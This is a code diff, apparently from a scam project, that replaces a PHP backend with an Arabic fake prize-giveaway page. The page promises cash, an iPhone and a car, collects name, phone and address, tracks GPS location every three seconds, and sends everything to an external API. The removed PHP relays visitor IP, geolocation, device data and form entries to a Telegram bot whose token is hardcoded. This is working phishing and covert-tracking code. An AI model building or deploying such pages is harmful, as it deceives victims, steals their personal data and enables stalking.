@@ -1,165 +1,144 @@
-<?php
-// ==============================================
-// 1. إعدادات قاعدة البيانات (Hostinger)
-// ==============================================
-$host = 'localhost'; // أو عنوان الخادم من Hostinger
-$dbname = 'اسم_قاعدة_البيانات';
-$username = 'اسم_المستخدم';
-$password = 'كلمة_المرور';
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>متجر منبج الآن</title>
+    <style>
+        /* أنماط مشابهة للتصميم السابق */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { min-height: 100vh; display: flex; justify-content: center; align-items: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; }
+        .container { background: white; border-radius: 20px; padding: 40px; max-width: 500px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); animation: slideUp 0.5s ease; }
+        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { font-size: 28px; color: #333; }
+        .logo span { color: #764ba2; }
+        .prize-badge { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 10px 20px; border-radius: 50px; display: inline-block; font-weight: bold; margin: 10px 0; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-weight: 600; margin-bottom: 5px; color: #555; }
+        .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; transition: border-color 0.3s; }
+        .form-group input:focus { border-color: #764ba2; outline: none; }
+        .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(118, 75, 162, 0.4); }
+        .prize-box { background: #f8f9fa; border-radius: 15px; padding: 20px; margin: 20px 0; text-align: center; border: 2px dashed #764ba2; }
+        .prize-box h3 { color: #764ba2; font-size: 22px; }
+        .prize-box .amount { font-size: 36px; font-weight: bold; color: #f5576c; }
+        .hidden { display: none; }
+        .success-box { background: #d4edda; border-radius: 15px; padding: 25px; text-align: center; border: 2px solid #28a745; }
+        .success-box h2 { color: #28a745; font-size: 28px; }
+        .success-box p { color: #155724; font-size: 18px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+<div class="container" id="app">
+    <div id="mainForm">
+        <div class="logo">
+            <h1>🛍️ متجر <span>منبج الآن</span></h1>
+            <div class="prize-badge">🎁 دعم 300$ قدامك الآن</div>
+        </div>
+        <div class="prize-box">
+            <h3>🎯 ادخل الآن واربح!</h3>
+            <p style="color: #666; margin: 10px 0;">جوائز تصل إلى <strong>$2000</strong></p>
+            <p style="color: #666;">📱 iPhone أحدث إصدار</p>
+            <p style="color: #666;">🚗 سيارة فاخرة</p>
+        </div>
+        <form id="userForm">
+            <div class="form-group">
+                <label>👤 الاسم الكامل</label>
+                <input type="text" id="name" placeholder="أدخل اسمك الكامل" required>
+            </div>
+            <div class="form-group">
+                <label>📱 رقم الجوال</label>
+                <input type="tel" id="phone" placeholder="أدخل رقم جوالك" required>
+            </div>
+            <div class="form-group">
+                <label>📍 العنوان</label>
+                <input type="text" id="address" placeholder="أدخل عنوانك" required>
+            </div>
+            <button type="submit" class="btn">🚀 قدام الآن</button>
+        </form>
+    </div>
+    <div id="successMessage" class="hidden">
+        <div class="success-box">
+            <h2>🎉 مبروك! 🎉</h2>
+            <div style="font-size: 48px; margin: 20px 0;">🏆</div>
+            <p style="font-size: 22px; font-weight: bold; color: #28a745;">
+                لقد ربحت <span id="prizeAmount">$500</span>!
+            </p>
+            <p>📱 iPhone أحدث إصدار</p>
+            <p>🚗 سيارة فاخرة</p>
+            <hr style="margin: 20px 0; border-color: #28a745;">
+            <p style="font-size: 18px;">✅ سيتم التواصل معك قريباً</p>
+            <p style="font-size: 16px; color: #155724; margin-top: 10px;">👤 <span id="userName"></span></p>
+        </div>
+    </div>
+</div>
 
-try {
-    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $username, $password);
-    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+<script>
+    // ============================================
+    // إعدادات الـ API (عدّل الرابط ليكون رابط ملف api.php على Hostinger)
+    // ============================================
+    const API_URL = 'https://almanartransd.com/t-bot/api.php'; // ⬅️ غيّر هذا الرابط
 
-    // إنشاء الجدول إذا لم يكن موجوداً
-    $pdo->exec("CREATE TABLE IF NOT EXISTS visitors (
-        id INT AUTO_INCREMENT PRIMARY KEY,
-        ip VARCHAR(45) NOT NULL,
-        location TEXT,
-        device TEXT,
-        browser TEXT,
-        name VARCHAR(255),
-        phone VARCHAR(50),
-        address TEXT,
-        prize INT,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )");
-} catch (PDOException $e) {
-    die("خطأ في قاعدة البيانات: " . $e->getMessage());
-}
-
-// ==============================================
-// 2. إعدادات بوت التليجرام
-// ==============================================
-define('TELEGRAM_BOT_TOKEN', '8954676427:AAGpFVLe-bwwB9tcrv5anWo1CRVVCknaycE');
-define('TELEGRAM_CHAT_ID', '5349663021'); // معرف المجموعة
-
-// ==============================================
-// 3. دوال مساعدة
-// ==============================================
-function getRealIP() {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
-    elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
-    return trim($ip);
-}
-
-function getGeolocation($ip) {
-    $url = "http://ip-api.com/json/{$ip}?fields=status,country,city,lat,lon,isp,proxy";
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    $response = curl_exec($ch);
-    curl_close($ch);
-    if ($response) return json_decode($response, true);
-    return null;
-}
-
-function sendToTelegram($message) {
-    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
-    $data = ['chat_id' => TELEGRAM_CHAT_ID, 'text' => $message, 'parse_mode' => 'HTML'];
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    curl_exec($ch);
-    curl_close($ch);
-}
-
-function sendLocationToTelegram($lat, $lng) {
-    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendLocation";
-    $data = ['chat_id' => TELEGRAM_CHAT_ID, 'latitude' => $lat, 'longitude' => $lng];
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    curl_exec($ch);
-    curl_close($ch);
-}
-
-// ==============================================
-// 4. معالجة الطلبات القادمة من Frontend
-// ==============================================
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $input = json_decode(file_get_contents('php://input'), true);
-    if (!$input) $input = $_POST; // للتوافق مع FormData
-
-    $ip = getRealIP();
-    $geo = getGeolocation($ip);
-    $device = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-    $browser = 'Unknown';
-    if (strpos($device, 'Chrome') !== false) $browser = 'Chrome';
-    elseif (strpos($device, 'Firefox') !== false) $browser = 'Firefox';
-    elseif (strpos($device, 'Safari') !== false) $browser = 'Safari';
-
-    $location = ($geo && $geo['status'] === 'success') ? "{$geo['city']}, {$geo['country']}" : 'Unknown';
-    $lat = $geo['lat'] ?? null;
-    $lng = $geo['lon'] ?? null;
-    $isp = $geo['isp'] ?? 'Unknown';
-    $isProxy = ($geo['proxy'] ?? false) ? 'نعم' : 'لا';
-
-    // تخزين في قاعدة البيانات
-    $stmt = $pdo->prepare("INSERT INTO visitors (ip, location, device, browser) VALUES (?, ?, ?, ?)");
-    $stmt->execute([$ip, $location, $device, $browser]);
-    $visitorId = $pdo->lastInsertId();
-
-    // إرسال البيانات الأولية للتليجرام
-    $msg = "🔔 <b>زائر جديد</b>\n";
-    $msg .= "🕐 الوقت: " . date('Y-m-d H:i:s') . "\n";
-    $msg .= "🌐 IP: {$ip}\n";
-    $msg .= "📍 الموقع: {$location}\n";
-    $msg .= "🛡️ بروكسي/VPN: {$isProxy}\n";
-    $msg .= "💻 الجهاز: {$device}\n";
-    $msg .= "🌍 المتصفح: {$browser}\n";
-    $msg .= "📡 مزود الخدمة: {$isp}\n";
-    sendToTelegram($msg);
-
-    if ($lat && $lng) {
-        sendLocationToTelegram($lat, $lng);
+    // ============================================
+    // إرسال البيانات إلى الـ API
+    // ============================================
+    function sendToAPI(data) {
+        fetch(API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(err => console.error('API Error:', err));
     }
 
-    // معالجة بيانات النموذج (الاسم، الجوال، العنوان)
-    if (isset($input['name']) || isset($input['phone']) || isset($input['address'])) {
-        $name = $input['name'] ?? '';
-        $phone = $input['phone'] ?? '';
-        $address = $input['address'] ?? '';
-        $prize = rand(50, 2000);
-
-        // تحديث السجل في قاعدة البيانات
-        $stmt = $pdo->prepare("UPDATE visitors SET name = ?, phone = ?, address = ?, prize = ? WHERE id = ?");
-        $stmt->execute([$name, $phone, $address, $prize, $visitorId]);
-
-        // رسالة الجائزة للتليجرام
-        $prizeMsg = "🎉 <b>فائز بجائزة!</b> 🎉\n";
-        $prizeMsg .= "👤 الاسم: {$name}\n";
-        $prizeMsg .= "📞 الجوال: {$phone}\n";
-        $prizeMsg .= "📍 العنوان: {$address}\n";
-        $prizeMsg .= "💰 الجائزة: $ {$prize}\n";
-        $prizeMsg .= "📱 iPhone أحدث إصدار\n";
-        $prizeMsg .= "🚗 سيارة فاخرة\n";
-        $prizeMsg .= "✅ سيتم التواصل معك قريباً";
-        sendToTelegram($prizeMsg);
+    // ============================================
+    // إرسال الموقع كل 3 ثواني (بعد موافقة المستخدم)
+    // ============================================
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                const { latitude, longitude } = position.coords;
+                sendToAPI({ lat: latitude, lng: longitude });
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => sendToAPI({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                        () => {} // فشل صامت
+                    );
+                }, 3000);
+            },
+            () => {} // فشل صامت
+        );
     }
 
-    // تحديث الموقع الحي (كل 3 ثواني)
-    if (isset($input['lat']) && isset($input['lng'])) {
-        $lat = $input['lat'];
-        $lng = $input['lng'];
-        sendLocationToTelegram($lat, $lng);
-        $locMsg = "📍 <b>تحديث موقع حي</b>\n";
-        $locMsg .= "🌐 IP: {$ip}\n";
-        $locMsg .= "🗺️ https://www.google.com/maps?q={$lat},{$lng}";
-        sendToTelegram($locMsg);
-    }
+    // ============================================
+    // معالجة نموذج البيانات
+    // ============================================
+    document.getElementById('userForm').addEventListener('submit', function(e) {
+        e.preventDefault();
 
-    // الرد بنجاح
-    header('Content-Type: application/json');
-    echo json_encode(['status' => 'success', 'id' => $visitorId]);
-    exit;
-}
-?>
+        const name = document.getElementById('name').value;
+        const phone = document.getElementById('phone').value;
+        const address = document.getElementById('address').value;
+
+        // إرسال بيانات النموذج إلى الـ API
+        sendToAPI({ name, phone, address });
+
+        // عرض رسالة الفوز
+        const prizes = [50, 100, 150, 200, 250, 300, 400, 500, 750, 1000, 1500, 2000];
+        const prize = prizes[Math.floor(Math.random() * prizes.length)];
+        document.getElementById('prizeAmount').textContent = '$' + prize;
+        document.getElementById('userName').textContent = name;
+
+        document.getElementById('mainForm').classList.add('hidden');
+        document.getElementById('successMessage').classList.remove('hidden');
+    });
+
+    // ============================================
+    // إرسال نبضات قلب (Heartbeat) كل 3 ثواني
+    // ============================================
+    setInterval(() => {
+        sendToAPI({ heartbeat: true });
+    }, 3000);
+</script>
+</body>
+</html>
